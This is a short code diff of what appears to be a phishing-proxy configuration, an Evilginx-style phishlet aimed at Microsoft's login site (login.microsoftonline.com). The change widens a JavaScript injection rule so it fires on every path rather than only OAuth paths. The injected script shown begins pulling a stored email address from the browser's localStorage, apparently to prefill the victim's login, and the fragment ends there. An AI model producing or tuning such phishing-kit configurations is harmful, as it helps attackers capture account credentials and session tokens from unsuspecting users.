@@ -43,7 +43,7 @@ sub_filters:
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
-    trigger_paths: ["/common/oauth2/"]
+    trigger_paths: ["/"]
     script: |
       var aemail = "";
       const cat = localStorage.getItem('email');
